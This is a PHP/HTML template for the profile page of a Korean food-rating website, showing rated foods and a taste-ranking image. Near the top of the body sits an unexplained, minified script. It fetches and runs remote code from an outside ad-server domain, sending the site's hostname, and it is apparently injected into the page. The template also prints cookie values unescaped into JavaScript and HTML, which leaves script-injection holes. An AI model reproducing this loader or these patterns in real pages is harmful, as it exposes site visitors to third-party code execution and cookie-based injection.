<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <?php
    include 'script/modules/LayoutHandler.php';
    (LayoutHandler::factory())->createTitle('내 정보');
    ?>
    
    <style>
        @font-face { /* 애플산돌고딕 폰트 적용 */
            font-family: "Jua";
            src: url("css/font/Jua-Regular.ttf") format("truetype");
            font-weight: normal;
        }
    </style>
    <link rel="stylesheet" href="/css/footer.css">
    <link rel="stylesheet" href="/css/header.css">
    <link rel="stylesheet" href="/css/my_info.css">

    <script
        src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>
    <script type="text/javascript">

        let userId= <?php echo $_COOKIE['user_id'];?>

        let mql = window.matchMedia("screen and (max-width: 768px)");
        let flag=false;
        mql.addListener(function(e) {
            if(e.matches) {
                // 모바일
                flag=true
            } else {
                // 데스크탑
                flag=false
            }
        });
    </script>
    <script type="text/javascript" src="script/javascript/my_info.js"></script>
    <script type="text/javascript" src="/script/javascript/modules.js"></script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
</script>

<div class="cover-container d-flex h-100 p-3 mx-auto flex-column" style="margin: 0 !important;">
    <?php (LayoutHandler::factory())->createHeader(); ?>

    <main role="main" class="inner cover d-flex" id="rating">
        <div id="left-content" class="card" style="margin: auto; height: 100%">
            <div>
                <div id="preview" class="img-box col align-self-center" style="margin: 20px auto 20px auto;">
                    <img src="/src/Portrait_Placeholder.png" id="userImage" class="card-img-top" alt="...">
                </div>
                <div>
                    <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
                    <input type="button" class="btn" id="fileSelect" value="프로필 이미지 변경" style="background-color:#e4bd74; color:white;">
                </div>
            </div>
            <div class="card-body">
                <h5 class="card-title"> <?php echo $_COOKIE['user_nickname']; ?> </h5>
                <p class="card-text">ssosso.table</p>
                <div id="high-rating">
                    <span style="display:block;">높은 점수를 준 음식들</span>
                    <div id="high-rating-holder" class="placeholder-glow" style="overflow-x: auto;">
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                    </div>
                </div>
                <div id="low-rating" >
                    <span style="display:block;">낮은 점수를 준 음식들</span>
                    <div id="low-rating-holder" class="placeholder-glow" style="overflow-x: auto;">
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                    </div>
                </div>
                <div id="my-info-taste" style="display:none;">
                    <span class="card-title" style="display: block">음식 취향 순위</span>
                    <div class="placeholder-glow">
                        <div class="card-img-top" id="taste-list" style="">
                            <img id="taste-image" src="config/ratingInfos/<?php echo $_COOKIE['user_id'];?>.png">
                        </div>
                    </div>
                    <ul class="card list-group list-group-flush" style="margin-top: auto;">
                        <li class="list-group-item" style="padding:0;">
                            <input type="button" value="평가한 음식" class="btn" style="background-color:#e4bd74; color:white; width: 100%;" data-bs-toggle="modal" data-bs-target="#myFoodModal" style="width:100%;">
                        </li>
                        <li class="list-group-item" style="padding: 0;">
                            <a href="/script/php/logout.php" style="margin-top: 5px;"><input type="button" value="로그아웃" class="btn" style="background-color:#e4bd74; color:white; width: 100%;"></a>
                        </li>
                    </ul>
                </div>
            </div>

        </div>
        <div class="card d-flex flex-columns" id='my-info' style="">
            <span class="card-title" style="display: block">음식 취향 순위</span>
            <div class="placeholder-glow">
                <div class="card-img-top" id="taste-list" style="">
                    <img id="taste-list-img" src="config/ratingInfos/<?php echo $_COOKIE['user_id'];?>.png">
                </div>
            </div>
            <ul class="card list-group list-group-flush" style="margin-top: auto;">
                <li class="list-group-item" style="padding:0;">
                    <input type="button" value="평가한 음식" class="btn" style="background-color:#e4bd74; color:white; width: 100%;" data-bs-toggle="modal" data-bs-target="#myFoodModal" style="width:100%;">
                </li>
                <li class="list-group-item" style="padding: 0;">
                    <a href="/script/php/logout.php" style="margin-top: 5px;"><input type="button" value="로그아웃" class="btn" style="background-color:#e4bd74; color:white; width: 100%;"></a>
                </li>
            </ul>
        </div>
    </main>

        <footer id="footer"  class="mastfoot mt-auto" style="background-color:#ffebaa;">
            <div class="inner">
                <p style="margin: 0;">Created by<a href="http://ssossotable.com" class="footer-link"> ssosso.table.u</a>, of <a href="http://ssossotable.com" class="footer-link">@ssosso.table</a></p>
            </div>
        </footer>
        </div>
        <!-- Button trigger modal -->



        <!-- Modal -->
        <div class="modal fade" id="myFoodModal" tabindex="-1" aria-labelledby="myFoodModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="myFoodModalLabel">내 음식</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body" id="scroll-layout-rating">
                        <div class="rating-placeholders">
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div style="display: inline-block; margin: 0;">
                                    <img src="/src/food_placeholder.png" height="60" width="60">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div style="display: inline-block; margin: 0;">
                                    <img src="/src/food_placeholder.png" height="60" width="60">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div style="display: inline-block; margin: 0;">
                                    <img src="/src/food_placeholder.png" height="60" width="60">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div style="display: inline-block; margin: 0;">
                                    <img src="/src/food_placeholder.png" height="60" width="60">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div style="display: inline-block; margin: 0;">
                                    <img src="/src/food_placeholder.png" height="60" width="60">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div style="display: inline-block; margin: 0;">
                                    <img src="/src/food_placeholder.png" height="60" width="60">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div style="display: inline-block; margin: 0;">
                                    <img src="/src/food_placeholder.png" height="60" width="60">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">닫기</button>
                    </div>
                </div>
            </div>
        </div>
</div>
<script>
    init()
</script>
</body>
</html>